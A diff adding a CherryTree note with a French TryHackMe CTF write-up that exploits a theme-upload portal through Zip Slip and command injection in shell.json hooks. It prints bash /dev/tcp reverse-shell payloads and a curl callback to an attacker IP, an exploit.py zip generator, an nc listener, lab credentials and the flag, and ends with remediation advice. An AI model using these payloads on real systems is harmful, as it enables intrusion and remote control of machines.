@@ -1,0 +1,115 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="2" master_id="0" name="sl1pp3d_1nt0_a_sh3ll}" prog_lang="markdown" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1785959493" ts_lastsave="1785964156">
+    <rich_text>TRY HACK ME — HOLIDAY CONTEXT CTF
+1. RECONNAISSANCE &amp; ENUMÉRATION
+
+    Target IP : 10.114.170.181
+
+    Objectif : Trouver le flag initial.
+
+Scan de ports (Rustscan)
+
+Le scan rapide révèle deux services actifs :
+
+    22/tcp : SSH
+
+    5000/tcp : Service Web (Gunicorn / Python)
+
+Énumération Web &amp; Authentification
+
+    Une énumération de répertoires (gobuster / dirsearch) et l'inspection du code source de la page d'accueil ont permis de découvrir une mire de connexion.
+
+    En inspectant le code source HTML, des identifiants valides ont été identifiés :
+
+        Username : concierge
+
+        Password : StayNoticed2024!
+
+2. ANALYSE DE L'APPLICATION WEB
+
+Après authentification sur le port 5000, nous accédons au panneau "Shoreline Display".
+Fonctionnalités &amp; Règles observées
+
+    Formulaire d'upload : Accepte des archives .zip représentant un "coquillage" (shell).
+
+    Fichier manifeste requis : L'archive doit impérativement contenir un fichier shell.json décrivant les ressources (assets).
+
+    Extensions autorisées : png, jpg, gif, svg, css, json.
+
+    Moteur en arrière-plan : Un composant nommé Theme Worker traite automatiquement l'archive après l'upload pour appliquer d'éventuels "automation hooks".
+
+Indices &amp; Hypothèses
+
+    Le texte d'aide précise : "Slip something inside and hold it to your ear (...) Slip past what the portal forgets to check, and the shell answers with a shell of your own."
+
+    Zip Slip (Path Traversal) : L'extraction de l'archive .zip ne valide pas correctement les chemins d'accès des fichiers contenus.
+
+    Command Injection / RCE : Le Theme Worker lit les instructions d'automatisation (hooks) du fichier shell.json et les exécute sans assainissement.
+
+3. EXPLOITATION &amp; INITIAL ACCESS
+Étape 1 : Vérification de l'extraction ZIP
+
+Un premier test avec un fichier .zip standard a permis de confirmer que l'application extrait les fichiers dans un sous-dossier accessible publiquement :
+[http://10.114.170.181:5000/shells/](http://10.114.170.181:5000/shells/)&lt;HASH_ALÉATOIRE&gt;/
+Étape 2 : Construction du Payload Malveillant
+
+Nous concevons un script Python pour générer une archive .zip combinant un manifeste shell.json piégé et des traversées de répertoires.
+Structure du shell.json (Command Injection via Hooks) :
+JSON
+
+{
+  "name": "HookInjection",
+  "version": "1.0",
+  "assets": ["style.css"],
+  "hooks": {
+    "pre_apply": "bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.135.15/4444 0&gt;&amp;1'",
+    "post_apply": "; bash -i &gt;&amp; /dev/tcp/192.168.135.15/4444 0&gt;&amp;1 ;",
+    "onload": "curl http://192.168.135.15:8000/hook_works"
+  }
+}
+
+Script de génération du ZIP (exploit.py) :
+Python
+
+import zipfile
+
+zip_filename = "payload_exploit.zip"
+
+manifest = '''{
+  "name": "HookInjection",
+  "version": "1.0",
+  "assets": ["style.css"],
+  "hooks": {
+    "pre_apply": "bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.135.15/4444 0&gt;&amp;1'"
+  }
+}'''
+
+with zipfile.ZipFile(zip_filename, 'w') as z:
+    z.writestr("shell.json", manifest)
+    z.writestr("style.css", "body { color: red; }")
+
+print(f"[+] Archive {zip_filename} générée avec succès.")
+
+4. OBTENTION DU FLAG
+
+    Démarrage d'un listener netcat sur la machine d'attaque :
+    Bash
+
+    nc -lvnp 4444
+
+    Upload du fichier payload_exploit.zip sur le portail [http://10.114.170.181:5000/upload](http://10.114.170.181:5000/upload).
+
+    Dès que le Theme Worker a exécuté l'analyse du manifeste et déclenché le hook pre_apply, la connexion est établie et le flag est récupéré.
+
+    FLAG : THM{z1p_sl1pp3d_1nt0_a_sh3ll}
+
+5. REMÉDIATION &amp; BHO
+
+Pour corriger les vulnérabilités identifiées sur cette application :
+
+    Décompression sécurisée : Valider explicitement les chemins relatifs lors de l'extraction d'une archive .zip pour empêcher toute écriture en dehors du répertoire cible (ex: utiliser os.path.commonpath en Python).
+
+    Sanitisation des Hooks : Ne jamais passer de commandes issues d'un fichier utilisateur à un interpréteur de commandes (os.system ou subprocess avec shell=True).</rich_text>
+  </node>
+</cherrytree>
